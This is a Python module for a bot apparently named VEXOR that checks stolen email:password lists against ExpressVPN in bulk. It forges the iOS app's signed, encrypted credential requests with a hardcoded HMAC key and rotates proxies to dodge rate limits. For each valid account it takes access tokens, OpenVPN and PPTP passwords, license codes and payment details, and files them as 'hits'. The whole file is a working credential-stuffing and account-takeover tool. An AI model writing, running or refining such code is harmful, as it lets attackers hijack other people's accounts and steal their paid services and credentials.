#!/usr/bin/env python3
"""ExpressVPN checker module for VEXOR bot — CMS/AES-128-CBC + Smart Proxy Cascade + Full Debug."""

import base64
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import gzip
import hashlib
import hmac
import json
import os
import random
import re
import string
import threading
import time

import config
from config import (
    get_proxy_for_attempt,
    log,
    report_proxy_fail,
    report_proxy_ok,
    resolve_country_code,
)
from cryptography import x509 as crypto_x509
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
  from asn1crypto import cms, core, x509 as asn1_x509
  ASN1CRYPTO_OK = True
except ImportError:
  ASN1CRYPTO_OK = False

CERT_BASE64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
)
HMAC_KEY = b"@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"

TIMEOUT = 15
MAX_ATTEMPTS = 4  # 0: Static #1, 1: Static #2, 2: Res SID #1, 3: Res SID #2


def _dbg(email, stage, proxy_lbl="", status_code=None, text=None, exc=None):
  parts = [f"[{email}] STAGE={stage}"]
  if proxy_lbl:
    parts.append(f"PROXY={proxy_lbl}")
  if status_code is not None:
    parts.append(f"HTTP={status_code}")
  if exc is not None:
    parts.append(f"EXC={type(exc).__name__}({exc})")
  if text is not None:
    snippet = text.strip()[:350].replace("\n", " ")
    parts.append(f"BODY={snippet!r}")
  log("express-dbg", " | ".join(parts), level="DEBUG")


# ═══════════════ CRYPTOGRAPHY & ASN.1 DER CMS BUILDER ═══════════════
def _aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
  padder = PKCS7(128).padder()
  padded = padder.update(data) + padder.finalize()
  cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
  encryptor = cipher.encryptor()
  return encryptor.update(padded) + encryptor.finalize()


def _aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
  cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
  decryptor = cipher.decryptor()
  decrypted = decryptor.update(data) + decryptor.finalize()
  unpadder = PKCS7(128).unpadder()
  return unpadder.update(decrypted) + unpadder.finalize()


def _compute_signature(data: bytes) -> str:
  return base64.b64encode(hmac.new(HMAC_KEY, data, hashlib.sha1).digest()).decode(
      "ascii"
  )


def _der_len(n: int) -> bytes:
  if n < 0x80:
    return bytes([n])
  b = n.to_bytes((n.bit_length() + 7) // 8, "big")
  return bytes([0x80 | len(b)]) + b


def _der_tlv(tag: int, val: bytes) -> bytes:
  return bytes([tag]) + _der_len(len(val)) + val


def _der_int(val: int) -> bytes:
  if val == 0:
    b = b"\x00"
  else:
    length = (val.bit_length() + 8) // 8
    b = val.to_bytes(length, "big", signed=True)
  return _der_tlv(0x02, b)


def _der_oid(oid_str: str) -> bytes:
  parts = [int(x) for x in oid_str.split(".")]
  out = bytearray([40 * parts[0] + parts[1]])
  for p in parts[2:]:
    if p == 0:
      out.append(0)
    else:
      buf = bytearray()
      while p > 0:
        buf.append(p & 0x7F)
        p >>= 7
      for i in range(len(buf) - 1, 0, -1):
        out.append(buf[i] | 0x80)
      out.append(buf[0])
  return _der_tlv(0x06, bytes(out))


def _envelope_encrypt(data: bytes, cert_base64: str) -> bytes:
  cert_der = base64.b64decode(cert_base64)
  aes_key = os.urandom(16)
  iv = os.urandom(16)
  encrypted_content = _aes_encrypt(data, aes_key, iv)

  crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
  public_key = crypto_cert.public_key()
  encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())

  if ASN1CRYPTO_OK:
    cert = asn1_x509.Certificate.load(cert_der)
    recipient_info = cms.RecipientInfo({
        "ktri": cms.KeyTransRecipientInfo({
            "version": cms.CMSVersion(0),
            "rid": cms.RecipientIdentifier({
                "issuer_and_serial_number": cms.IssuerAndSerialNumber({
                    "issuer": cert["tbs_certificate"]["issuer"],
                    "serial_number": cert["tbs_certificate"]["serial_number"],
                })
            }),
            "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({
                "algorithm": "1.2.840.113549.1.1.1",
                "parameters": core.Null(),
            }),
            "encrypted_key": encrypted_key,
        })
    })
    enveloped_data = cms.EnvelopedData({
        "version": cms.CMSVersion(0),
        "recipient_infos": cms.RecipientInfos([recipient_info]),
        "encrypted_content_info": cms.EncryptedContentInfo({
            "content_type": "1.2.840.113549.1.7.1",
            "content_encryption_algorithm": cms.EncryptionAlgorithm({
                "algorithm": "2.16.840.1.101.3.4.1.2",
                "parameters": iv,
            }),
            "encrypted_content": encrypted_content,
        }),
    })
    content_info = cms.ContentInfo({
        "content_type": "1.2.840.113549.1.7.3",
        "content": enveloped_data,
    })
    return content_info.dump()

  # Pure DER builder (works even without asn1crypto)
  issuer_der = crypto_cert.issuer.public_bytes()
  serial_der = _der_int(crypto_cert.serial_number)
  issuer_and_serial = _der_tlv(0x30, issuer_der + serial_der)
  kea = _der_tlv(0x30, _der_oid("1.2.840.113549.1.1.1") + b"\x05\x00")
  ktri = _der_tlv(
      0x30,
      _der_int(0) + issuer_and_serial + kea + _der_tlv(0x04, encrypted_key),
  )
  recipient_infos = _der_tlv(0x31, ktri)
  cea = _der_tlv(0x30, _der_oid("2.16.840.1.101.3.4.1.2") + _der_tlv(0x04, iv))
  eci = _der_tlv(
      0x30,
      _der_oid("1.2.840.113549.1.7.1")
      + cea
      + _der_tlv(0x80, encrypted_content),
  )
  enveloped_data = _der_tlv(0x30, _der_int(0) + recipient_infos + eci)
  return _der_tlv(
      0x30, _der_oid("1.2.840.113549.1.7.3") + _der_tlv(0xA0, enveloped_data)
  )


def _gen_install_id() -> str:
  chars = string.ascii_lowercase + string.digits
  return "".join(random.choice(chars) for _ in range(64))


def _single_attempt(email: str, password: str, proxy_url: str, proxy_lbl: str):
  """Run a single ExpressVPN check attempt with the given proxy."""
  session = requests.Session()
  session.verify = False
  session.trust_env = False
  if proxy_url:
    if not proxy_url.startswith(("http://", "https://", "socks5://", "socks4://")):
      proxy_url = f"http://{proxy_url}"
    session.proxies = {"http": proxy_url, "https": proxy_url}

  session.headers.update({
      "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2"
  })

  try:
    iv = os.urandom(16)
    key = os.urandom(16)
    base64_iv = base64.b64encode(iv).decode("ascii")
    base64_key = base64.b64encode(key).decode("ascii")
    install_id = _gen_install_id()

    post_data = json.dumps({
        "email": email,
        "iv": base64_iv,
        "key": base64_key,
        "password": password,
    })
    gzipped = gzip.compress(post_data.encode("utf-8"), compresslevel=9)
    encrypted_post = _envelope_encrypt(gzipped, CERT_BASE64)

    header_raw = (
        "POST /apis/v2/credentials?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    header_signature = _compute_signature(header_raw.encode("ascii"))
    post_signature = _compute_signature(encrypted_post)

    url = (
        "https://www.expressapisv2.net/apis/v2/credentials"
        f"?client_version=11.5.2&installation_id={install_id}"
        "&os_name=ios&os_version=14.4"
    )
    headers = {
        "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
        "Expect": "",
        "Content-Type": "application/octet-stream",
        "X-Body-Compression": "gzip",
        "X-Signature": f"2 {header_signature} 91c776e",
        "X-Body-Signature": f"2 {post_signature} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
    }

    response = session.post(
        url, data=encrypted_post, headers=headers, timeout=TIMEOUT
    )
    _dbg(
        email,
        "CREDENTIALS",
        proxy_lbl=proxy_lbl,
        status_code=response.status_code,
        text=f"len={len(response.content)}",
    )

    if response.status_code in (400, 401):
      return "bad", {}
    if response.status_code in (429, 500, 502, 503):
      return "ban", {}
    if response.status_code != 200:
      return "net", {}

    try:
      decrypted = _aes_decrypt(
          response.content,
          base64.b64decode(base64_key),
          base64.b64decode(base64_iv),
      )
      response_body = decrypted.decode("utf-8", errors="ignore")
    except Exception as e:
      _dbg(email, "DECRYPT_ERR", proxy_lbl=proxy_lbl, exc=e)
      return "net", {}

    _dbg(email, "DECRYPTED", proxy_lbl=proxy_lbl, text=response_body[:250])

    try:
      access_token = re.search(
          r'"access_token"\s*:\s*"([^"]+)"', response_body
      ).group(1)
      ovpn_user_m = re.search(
          r'"ovpn_username"\s*:\s*"([^"]+)"', response_body
      )
      ovpn_pass_m = re.search(
          r'"ovpn_password"\s*:\s*"([^"]+)"', response_body
      )
      pptp_user_m = re.search(
          r'"pptp_username"\s*:\s*"([^"]+)"', response_body
      )
      pptp_pass_m = re.search(
          r'"pptp_password"\s*:\s*"([^"]+)"', response_body
      )
      ovpn_user = ovpn_user_m.group(1) if ovpn_user_m else "N/A"
      ovpn_pass = ovpn_pass_m.group(1) if ovpn_pass_m else "N/A"
      pptp_user = pptp_user_m.group(1) if pptp_user_m else "N/A"
      pptp_pass = pptp_pass_m.group(1) if pptp_pass_m else "N/A"
    except Exception as e:
      _dbg(email, "PARSE_TOKENS_ERR", proxy_lbl=proxy_lbl, exc=e)
      return "bad", {}

    # ── Step 2: Batch Subscription Query ──
    sub_raw = (
        f"GET /apis/v2/subscription?access_token={access_token}"
        f"&client_version=11.5.2&installation_id={install_id}"
        "&os_name=ios&os_version=14.4&reason=activation_with_email"
    )
    sub_signature = _compute_signature(sub_raw.encode("ascii"))

    batch_raw = (
        "POST /apis/v2/batch?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    batch_signature = _compute_signature(batch_raw.encode("ascii"))

    capture_body = (
        f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2'
        f' {sub_signature} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
    )
    capture_signature = _compute_signature(capture_body.encode("ascii"))

    batch_url = (
        "https://www.expressapisv2.net/apis/v2/batch"
        f"?client_version=11.5.2&installation_id={install_id}"
        "&os_name=ios&os_version=14.4"
    )
    batch_headers = {
        "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
        "X-Body-Compression": "gzip",
        "X-Signature": f"2 {batch_signature} 91c776e",
        "X-Body-Signature": f"2 {capture_signature} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
    }

    batch_response = session.post(
        batch_url, data=capture_body, headers=batch_headers, timeout=TIMEOUT
    )
    _dbg(
        email,
        "BATCH_SUB",
        proxy_lbl=proxy_lbl,
        status_code=batch_response.status_code,
        text=batch_response.text,
    )

    btxt = batch_response.text or ""
    if (
        "subscription" not in btxt
        or "REVOKED" in btxt
        or 'status\\":\\"\\"' in btxt
    ):
      cc = resolve_country_code(email)
      return (
          "expired",
          {
              "plan": "EXPIRED",
              "expiry": "N/A",
              "days": -1,
              "country": cc,
              "ovpn": f"{ovpn_user}:{ovpn_pass}",
              "pptp": f"{pptp_user}:{pptp_pass}",
          },
      )

    try:
      unescaped = btxt.encode("utf-8", errors="ignore").decode(
          "unicode_escape", errors="ignore"
      )
    except Exception:
      unescaped = btxt

    plan_match = re.search(r'billing_cycle"\s*:\s*(\d+)', unescaped)
    plan = f"{plan_match.group(1)} Month" if plan_match else "Active Plan"

    auto_renew_match = re.search(r'auto_bill"\s*:\s*([a-zA-Z]+)', unescaped)
    auto_renew = (
        auto_renew_match.group(1).lower() == "true"
        if auto_renew_match
        else False
    )

    exp_match = re.search(r'expiration_time"\s*:\s*(\d+)', unescaped)
    expiration = int(exp_match.group(1)) if exp_match else 0

    current_time = int(time.time())
    days_left = (
        round((expiration - current_time) / 86400)
        if expiration > current_time
        else -1
    )
    expire_date = (
        datetime.fromtimestamp(expiration).strftime("%Y-%m-%d")
        if expiration
        else "N/A"
    )

    payment_match = re.search(r'payment_method"\s*:\s*"([^"]+)"', unescaped)
    payment = payment_match.group(1) if payment_match else "Unknown"

    if days_left < 0 and expiration > 0:
      cc = resolve_country_code(email)
      return (
          "expired",
          {
              "plan": f"EXPIRED ({plan})",
              "expiry": expire_date,
              "days": days_left,
              "country": cc,
              "payment_method": payment,
              "ovpn": f"{ovpn_user}:{ovpn_pass}",
              "pptp": f"{pptp_user}:{pptp_pass}",
          },
      )

    # ── Step 3: Fetch License Code (longCode) ──
    license_code = "N/A"
    web_headers = {
        "Host": "www.expressvpn.com",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0)"
            " Gecko/20100101 Firefox/147.0"
        ),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://portal.expressvpn.com/my-subscriptions",
        "authorization": f"Bearer {access_token}",
        "content-type": "application/json",
        "x-tenant": "xvpn",
        "Origin": "https://portal.expressvpn.com",
        "Connection": "keep-alive",
    }
    try:
      web_resp = session.get(
          "https://www.expressvpn.com/api/v2/subscriptions",
          headers=web_headers,
          timeout=TIMEOUT,
      )
      _dbg(
          email,
          "WEB_SUB",
          proxy_lbl=proxy_lbl,
          status_code=web_resp.status_code,
          text=web_resp.text,
      )
      licenses = re.findall(r'longCode"\s*:\s*"([^"]+)"', web_resp.text or "")
      if licenses:
        license_code = licenses[-1]
    except Exception as e:
      _dbg(email, "WEB_SUB_ERR", proxy_lbl=proxy_lbl, exc=e)

    cc = resolve_country_code(email)
    details = {
        "plan": plan,
        "auto_renew": auto_renew,
        "expiry": expire_date,
        "expire_date": expire_date,
        "days": days_left,
        "days_left": days_left,
        "payment_method": payment,
        "license": license_code,
        "ovpn_user": ovpn_user,
        "ovpn_pass": ovpn_pass,
        "pptp_user": pptp_user,
        "pptp_pass": pptp_pass,
        "country": cc,
    }
    _dbg(email, "HIT", proxy_lbl=proxy_lbl, text=str(details))
    return "hit", details

  except (requests.exceptions.Timeout, requests.exceptions.RequestException) as e:
    _dbg(email, "NET_ERR", proxy_lbl=proxy_lbl, exc=e)
    return "net", {}
  except Exception as e:
    _dbg(email, "EXCEPTION", proxy_lbl=proxy_lbl, exc=e)
    return "net", {}
  finally:
    session.close()


def check_account(email: str, password: str, job=None):
  """Check an ExpressVPN account using the 3-tier proxy cascade + quarantine:

  Attempt 0 -> Static Proxy #1
  Attempt 1 -> Static Proxy #2 (different IP)
  Attempt 2+ -> Residential Rotating Proxy (fresh SID IP each time)
  """
  prev_proxy = None
  retried = False
  last_res = "net"

  for attempt in range(MAX_ATTEMPTS):
    if job and job.cancelled:
      return "net", {}
    proxy_url, proxy_lbl = get_proxy_for_attempt(attempt, prev_proxy=prev_proxy)
    prev_proxy = proxy_url
    if attempt > 0:
      retried = True
      if job:
        with job.lock:
          job.retried += 1
      log(
          "express-dbg",
          f"[{email}] RETRY attempt={attempt} switching to PROXY={proxy_lbl}",
          level="DEBUG",
      )

    res, details = _single_attempt(email, password, proxy_url, proxy_lbl)
    last_res = res

    if res in ("hit", "expired", "bad"):
      report_proxy_ok(proxy_url)
      if retried and job:
        with job.lock:
          job.recovered += 1
      return res, details

    report_proxy_fail(proxy_url, reason=res)
    if res == "ban" and job:
      with job.lock:
        job.throttled += 1
    time.sleep(random.uniform(0.4, 0.9))

  log(
      "express-dbg",
      f"[{email}] EXHAUSTED all {MAX_ATTEMPTS} attempts -> {last_res}",
      level="DEBUG",
  )
  return "net", {}


def run(job, reporter):
  """Run ExpressVPN checker with chunked submission and watcher thread."""
  max_workers = getattr(config, "EXPRESS_THREADS", 25)
  log(
      "express",
      f"start chat={job.chat_id} combos={len(job.combos)} workers={max_workers}",
      level="INFO",
  )

  done_evt = threading.Event()

  def _watcher():
    while not done_evt.is_set():
      try:
        reporter()
      except Exception as e:
        log("express", f"reporter: {e}", "WARN")
      done_evt.wait(3)

  threading.Thread(target=_watcher, daemon=True).start()

  def worker(combo):
    if job.cancelled:
      return
    email, password = combo[0], combo[1]
    result, details = check_account(email, password, job=job)

    with job.lock:
      job.processed += 1
      job.done_keys.add((email.lower(), password))

      if result == "hit":
        job.valid += 1
        job.valid_list.append((email, password, details))
      elif result == "expired":
        job.free += 1
        job.free_list.append((email, password, details))
      elif result == "bad":
        job.bad += 1
      else:
        job.net += 1

  try:
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
      pending = set()
      for combo in job.combos:
        if job.cancelled:
          break
        while len(pending) >= max_workers * 2:
          done, pending = concurrent.futures.wait(
              pending, return_when=concurrent.futures.FIRST_COMPLETED
          )
          if job.cancelled:
            break
        if job.cancelled:
          break
        pending.add(executor.submit(worker, combo))

      for future in as_completed(pending):
        if job.cancelled:
          for fx in pending:
            fx.cancel()
          break
        try:
          future.result()
        except Exception as e:
          log("express", f"Worker error: {e}", level="ERROR")
  finally:
    done_evt.set()
    try:
      reporter(force=True)
    except Exception:
      pass

  log(
      "express",
      f"done chat={job.chat_id} valid={job.valid} expired={job.free} "
      f"bad={job.bad} net={job.net} retried={job.retried} recovered={job.recovered}",
      "DONE",
  )
